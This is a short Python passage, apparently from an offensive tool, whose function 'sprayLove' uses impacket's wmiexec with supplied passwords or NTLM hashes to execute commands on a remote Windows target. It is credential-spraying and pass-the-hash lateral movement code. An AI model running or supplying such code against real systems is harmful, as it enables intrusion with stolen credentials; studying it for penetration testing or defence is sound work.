...
def sprayLove(user, target, local_ip):
    try:
        exec_method = wmiexec.WMIEXEC('', user.username, user.password, user.domain, user.lmhash + ':' + user.nthash, None, None, False, False, None)
        logging.info("%s%s: %swmiexec%s seems to be an %sOK%s method. Fire!" % (infoYellow, target, green, white, green, white))
        if exec_method : exec_method.run(target, get_os_arch(target))
